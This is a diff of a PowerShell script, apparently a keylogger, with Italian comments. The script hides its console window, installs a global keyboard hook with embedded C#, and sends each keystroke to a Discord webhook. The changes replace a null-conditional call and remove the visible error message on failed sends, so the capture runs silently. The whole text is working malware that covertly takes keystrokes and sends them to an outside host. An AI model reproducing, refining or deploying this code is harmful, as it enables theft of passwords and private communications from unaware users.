@@ -30,7 +30,7 @@ public class Win {
 "@
 [Win]::ShowWindow([Win]::GetConsoleWindow(), [Win]::SW_HIDE)
 
-# --- Global keyboard hook via Add-Type ---
+# --- Global keyboard hook via Add-Type (senza null‑conditional) ---
 Add-Type -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -76,8 +76,10 @@ public class GlobalKeyboardListener {
             int vkCode = Marshal.ReadInt32(lParam);
             string key = ((Keys)vkCode).ToString();
             // invoke only if subscribed
-            OnKeyPressed?.Invoke(key);
-            // ESC to exit
+            if (OnKeyPressed != null) {
+                OnKeyPressed(key);
+            }
+            // ESC per uscire
             if ((Keys)vkCode == Keys.Escape) {
                 Stop();
                 Application.Exit();
@@ -95,9 +97,7 @@ public class GlobalKeyboardListener {
     param($k)
     try {
         Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $k } | ConvertTo-Json) -ContentType "application/json"
-    } catch {
-        Write-Host "Failed to send key to Discord: $_" -ForegroundColor Red
-    }
+    } catch { }
 }
 
 # --- Avvio hook (invisibile) ---
